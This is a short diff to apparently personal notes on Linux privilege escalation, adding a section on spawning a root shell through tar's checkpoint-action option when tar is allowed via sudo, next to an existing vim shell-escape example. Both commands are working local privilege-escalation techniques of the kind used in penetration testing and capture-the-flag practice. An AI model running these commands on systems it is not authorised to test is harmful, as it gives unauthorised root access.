@@ -47,3 +47,10 @@ sudo vim
 
 ##_Second option_
 sudo vim -c ':!/bin/sh'
+
+
+#Privilege scalation with tar
+
+If the user is allowed in the sudoers file we can easily become root by running _sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh_
+
+
